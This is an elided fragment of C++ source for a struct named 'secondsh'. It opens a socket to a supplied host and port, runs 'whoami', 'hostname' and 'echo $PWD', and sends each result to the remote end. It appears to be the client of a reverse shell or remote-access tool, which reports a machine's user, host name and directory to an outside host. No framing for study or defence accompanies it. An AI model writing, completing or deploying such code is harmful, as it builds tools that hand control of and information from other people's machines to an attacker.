...
struct secondsh{
    ...
    void send_bytes(int* socketptr, std::string buffer){
        char temp[buffer.length()+1];
        strcpy(temp, buffer.c_str());

        bytes_written += send(*(socketptr), (char*)&temp, strlen(temp), 0);
    }
    ...
    int* connect_socket(unsigned int PORT, const std::string hostname){
        ...
        std::string whoami = system_output("whoami");
        ...
        std::string chostname = system_output("hostname");
        memset(&buffer, 0x00, sizeof(buffer)); //clear the buffer
        strcpy(buffer, chostname.c_str());
        bytes_written += send(client_sd, (char*)&buffer, strlen(buffer), 0);

        std::string current_dir = system_output("echo $PWD");
